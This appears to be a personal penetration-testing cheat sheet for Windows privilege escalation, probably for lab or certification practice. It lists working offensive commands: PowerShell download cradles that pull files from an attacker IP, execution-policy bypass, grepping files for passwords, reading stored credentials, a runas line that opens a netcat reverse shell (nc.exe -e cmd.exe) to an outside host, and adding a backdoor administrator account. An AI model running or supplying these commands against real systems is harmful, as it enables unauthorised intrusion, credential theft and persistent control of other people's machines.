PowerUp: Privilege escalation checks
Grab latest scripts from https://github .com/PowerShellMafia/PowerSploit/tree/master/Privesc

	powershell "(new-object System.Net.WebClient).Downloadfile('http://IP/FILE', 'name_of_file_to_be_created')"
	powershell -nop -ep bypass
	import-module C:\users\whowveryouare\Documents\powerup.ps1
	invoke-allchecks

Non-interactive execute powershell file

	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1

File transfer

	powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"

Search entire directory for xml files for passwords

	dir /b /s *.xml
	findstr /si password *.txt
	findstr /si password *.xml
	findstr /si password *.ini

/in powershell

	PS C:\> get-childitem -path C:\ -filter *.ps1 -recurse -erroraction silentlycontinue -force

upload paths

	create c:\temp
	C:\windows\system32\spool\drivers\color

Look for stored credentials

	cmdkey /list
	runas /savecred /user:<user>"c:\users\Public\nc.exe -nv 10.11.1.1 44 -e cmd.exe"

Bypass UAC

	powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

See if you have token impersonation rights - if so infiltrate churrasco (confirmed working on w2k3)

	whoami /priv

Feed contents of systeminfo into https://www.exploit-db.com/exploits/39719 for local exploits

Check LOCAL listening ports which you may be able to port forward
either with plink or local commands

	netstat -ano

Can use accesschk.exe (infiltrate it) to show us required Priv level for each service

	accesschk.exe -ucqv Spooler /accepteula

Can you use procexp.exe (infiltrate it) to enumerate processes? (remember pspy?)

	cmd /c procexp64.exe -accepteula

Add users

	net user shrek shrekt123 /add
	net localgroup administrators shrek /add

